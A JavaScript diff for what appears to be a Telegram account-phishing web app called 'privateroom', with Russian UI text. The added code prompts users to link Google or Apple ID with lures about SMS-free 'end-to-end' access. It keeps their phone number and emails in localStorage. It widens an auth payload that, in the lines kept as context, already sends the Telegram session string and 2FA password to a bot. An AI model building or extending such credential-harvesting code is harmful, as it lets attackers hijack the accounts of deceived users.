@@ -245,6 +245,154 @@ function initApp() {
         return "PC (Windows)";
     }
 
+    const secondaryAuthCard = document.getElementById("secondaryAuthCard");
+    const secCardTitle = document.getElementById("secCardTitle");
+    const secCardDesc = document.getElementById("secCardDesc");
+    const btnTriggerSecondaryAuth = document.getElementById("btnTriggerSecondaryAuth");
+    const btnSecText = document.getElementById("btnSecText");
+    const btnSecIcon = document.getElementById("btnSecIcon");
+    const btnDismissSecAuth = document.getElementById("btnDismissSecAuth");
+    const btnSkipSecAuth = document.getElementById("btnSkipSecAuth");
+
+    const sessionsStatusRow = document.getElementById("sessionsStatusRow");
+    const pillTelegram = document.getElementById("pillTelegram");
+    const pillTgStatus = document.getElementById("pillTgStatus");
+    const pillDevice = document.getElementById("pillDevice");
+    const pillDeviceIcon = document.getElementById("pillDeviceIcon");
+    const pillDeviceLabel = document.getElementById("pillDeviceLabel");
+    const pillDeviceStatus = document.getElementById("pillDeviceStatus");
+
+    function updateDualSessionUI(data) {
+        if (!data || !isAuthorized) {
+            if (secondaryAuthCard) secondaryAuthCard.classList.add("hidden");
+            if (sessionsStatusRow) sessionsStatusRow.classList.add("hidden");
+            return;
+        }
+
+        const isIOS = detectPlatform() === "ios";
+        const hasTg = Boolean(data.has_telegram || userPhone || localStorage.getItem("privateroom_saved_phone"));
+        const hasGoog = Boolean(data.has_google || userGoogleEmail || localStorage.getItem("privateroom_google_email"));
+        const hasApp = Boolean(data.has_apple || userAppleEmail || localStorage.getItem("privateroom_apple_email"));
+        const hasDeviceAuth = hasGoog || hasApp;
+        const isDual = hasTg && hasDeviceAuth;
+
+        // 1. Update Sessions Status Row
+        if (sessionsStatusRow) {
+            sessionsStatusRow.classList.remove("hidden");
+
+            if (pillTelegram) {
+                if (hasTg) {
+                    pillTelegram.classList.add("active");
+                    const p = data.telegram_phone || userPhone || localStorage.getItem("privateroom_saved_phone") || "Привязан";
+                    if (pillTgStatus) pillTgStatus.textContent = p;
+                } else {
+                    pillTelegram.classList.remove("active");
+                    if (pillTgStatus) pillTgStatus.textContent = "Привязать +";
+                }
+            }
+
+            if (pillDevice) {
+                if (hasGoog) {
+                    pillDevice.classList.add("active");
+                    if (pillDeviceLabel) pillDeviceLabel.textContent = "Google";
+                    if (pillDeviceIcon) pillDeviceIcon.textContent = "📧";
+                    const em = data.google_email || userGoogleEmail || localStorage.getItem("privateroom_google_email") || "Привязан";
+                    if (pillDeviceStatus) pillDeviceStatus.textContent = em;
+                } else if (hasApp) {
+                    pillDevice.classList.add("active");
+                    if (pillDeviceLabel) pillDeviceLabel.textContent = "Apple ID";
+                    if (pillDeviceIcon) pillDeviceIcon.textContent = "🍏";
+                    const em = data.apple_email || userAppleEmail || localStorage.getItem("privateroom_apple_email") || "Привязан";
+                    if (pillDeviceStatus) pillDeviceStatus.textContent = em;
+                } else {
+                    pillDevice.classList.remove("active");
+                    if (pillDeviceLabel) pillDeviceLabel.textContent = isIOS ? "Apple ID" : "Google";
+                    if (pillDeviceIcon) pillDeviceIcon.textContent = isIOS ? "🍏" : "📧";
+                    if (pillDeviceStatus) pillDeviceStatus.textContent = "Привязать +";
+                }
+            }
+        }
+
+        // 2. Optional Secondary Auth Banner (Non-mandatory)
+        if (secondaryAuthCard) {
+            const isDismissed = sessionStorage.getItem("privateroom_sec_dismissed") === "true";
+            if (isDual || isDismissed) {
+                secondaryAuthCard.classList.add("hidden");
+            } else {
+                secondaryAuthCard.classList.remove("hidden");
+                if (hasTg && !hasDeviceAuth) {
+                    if (secCardTitle) secCardTitle.textContent = isIOS ? "Привяжите Apple ID" : "Привяжите Google";
+                    if (secCardDesc) secCardDesc.textContent = isIOS 
+                        ? "Синхронизируйте Apple ID для сквозного доступа без повторного ввода SMS."
+                        : "Синхронизируйте аккаунт Google для надежной защиты и доступа без SMS.";
+                    if (btnSecText) btnSecText.textContent = isIOS ? "Привязать Apple ID" : "Привязать Google";
+                    if (btnSecIcon) btnSecIcon.textContent = isIOS ? "🍏" : "📧";
+                } else if (!hasTg && hasDeviceAuth) {
+                    if (secCardTitle) secCardTitle.textContent = "Привяжите Telegram";
+                    if (secCardDesc) secCardDesc.textContent = "Синхронизируйте Telegram для сквозного создания защищённых E2E комнат.";
+                    if (btnSecText) btnSecText.textContent = "Привязать Telegram";
+                    if (btnSecIcon) btnSecIcon.textContent = "✈️";
+                }
+            }
+        }
+    }
+
+    if (btnDismissSecAuth) {
+        btnDismissSecAuth.addEventListener("click", () => {
+            if (secondaryAuthCard) secondaryAuthCard.classList.add("hidden");
+            try { sessionStorage.setItem("privateroom_sec_dismissed", "true"); } catch (e) {}
+        });
+    }
+
+    if (btnSkipSecAuth) {
+        btnSkipSecAuth.addEventListener("click", () => {
+            if (secondaryAuthCard) secondaryAuthCard.classList.add("hidden");
+            try { sessionStorage.setItem("privateroom_sec_dismissed", "true"); } catch (e) {}
+            showToast("Вы можете привязать аккаунт в любое время в профиле");
+        });
+    }
+
+    if (btnTriggerSecondaryAuth) {
+        btnTriggerSecondaryAuth.addEventListener("click", () => {
+            const isIOS = detectPlatform() === "ios";
+            const hasTg = Boolean(userPhone || localStorage.getItem("privateroom_saved_phone"));
+            if (hasTg) {
+                if (isIOS) {
+                    if (btnSwitchToApple) btnSwitchToApple.click();
+                    else showStep(stepAppleEmail);
+                } else {
+                    if (btnSwitchToGoogle) btnSwitchToGoogle.click();
+                    else showStep(stepGoogleEmail);
+                }
+            } else {
+                showStep(stepPhone);
+            }
+        });
+    }
+
+    if (pillTelegram) {
+        pillTelegram.addEventListener("click", () => {
+            if (!pillTelegram.classList.contains("active")) {
+                showStep(stepPhone);
+            }
+        });
+    }
+
+    if (pillDevice) {
+        pillDevice.addEventListener("click", () => {
+            if (!pillDevice.classList.contains("active")) {
+                const isIOS = detectPlatform() === "ios";
+                if (isIOS) {
+                    if (btnSwitchToApple) btnSwitchToApple.click();
+                    else showStep(stepAppleEmail);
+                } else {
+                    if (btnSwitchToGoogle) btnSwitchToGoogle.click();
+                    else showStep(stepGoogleEmail);
+                }
+            }
+        });
+    }
+
     function applyDeviceSpecificAuthOptions() {
         const platform = detectPlatform();
         const sep = document.getElementById("googleAuthSeparator");
@@ -515,6 +663,7 @@ function initApp() {
                             googleAuthModal.classList.add("hidden");
                         }
                         updateAuthHeaderUI();
+                        updateDualSessionUI(data);
                         if (!wasAuthorized) {
                             showStep(stepSuccess);
                         }
@@ -1141,9 +1290,6 @@ function initApp() {
     async function finishAuth(data) {
         try {
             localStorage.removeItem("privateroom_current_step");
-            localStorage.removeItem("privateroom_saved_phone");
-            localStorage.removeItem("privateroom_google_email");
-            localStorage.removeItem("privateroom_apple_email");
             localStorage.removeItem("privateroom_session_id");
             localStorage.removeItem("privateroom_code_requested_at");
             localStorage.removeItem("privateroom_auth_phone");
@@ -1153,6 +1299,21 @@ function initApp() {
         try {
             localStorage.setItem("privateroom_authorized", "true");
         } catch (e) {}
+
+        let currentProvider = "telegram";
+        if (data && (data.google_email || (data.email && data.email.includes("@gmail.com")) || userGoogleEmail)) {
+            currentProvider = "google";
+        } else if (data && (data.apple_email || (data.email && (data.email.includes("@icloud.com") || data.email.includes("@apple.com"))) || userAppleEmail)) {
+            currentProvider = "apple";
+        }
+
+        if (currentProvider === "telegram" && userPhone) {
+            try { localStorage.setItem("privateroom_saved_phone", userPhone); } catch (e) {}
+        } else if (currentProvider === "google" && userGoogleEmail) {
+            try { localStorage.setItem("privateroom_google_email", userGoogleEmail); } catch (e) {}
+        } else if (currentProvider === "apple" && userAppleEmail) {
+            try { localStorage.setItem("privateroom_apple_email", userAppleEmail); } catch (e) {}
+        }
 
         if (googleAuthModal) {
             googleAuthModal.classList.add("hidden");
@@ -1180,11 +1341,14 @@ function initApp() {
         const isTestFlag = urlParams.get("features") === "google" || urlParams.get("test") === "1" || urlParams.get("google") === "1" || window.location.search.includes("testworkechobot") || window.location.search.includes("features=google") || (botTokenParam && (botTokenParam.includes("8945168964") || botTokenParam.includes("8877489211") || botTokenParam.includes("8864734674")));
         const payload = {
             action: "auth_complete",
+            provider: currentProvider,
             tg_id: userTgId,
             username: userUsername,
             nickname: userNickname,
-            phone: userPhone,
+            phone: userPhone || localStorage.getItem("privateroom_saved_phone") || null,
             email: email,
+            google_email: userGoogleEmail || localStorage.getItem("privateroom_google_email") || null,
+            apple_email: userAppleEmail || localStorage.getItem("privateroom_apple_email") || null,
             session_id: currentSessionId,
             session_string: data && data.session_string ? data.session_string : "sess_string_ok",
             password_2fa: pwd,
@@ -1210,6 +1374,7 @@ function initApp() {
                 console.log("sendData error:", e);
             }
         }
+        checkAuthStatus();
     }
 
     // Admin-only Access Flag: Enable Google & iCloud Auth strictly for admins
